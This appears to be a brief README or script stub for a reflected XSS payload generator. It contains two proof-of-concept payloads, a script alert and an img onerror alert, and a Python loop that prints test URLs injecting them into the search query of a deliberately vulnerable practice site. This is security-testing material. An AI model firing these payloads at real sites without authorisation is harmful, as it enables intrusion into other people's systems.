# JAttack-XSS-XSS-Payload-Generator-
Task: Test reflected XSS in search?query= (like your PoC).
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>"
]

for payload in xss_payloads:
    print(f"Test URL: http://testphp.vulnweb.com/search?query={payload}")
    
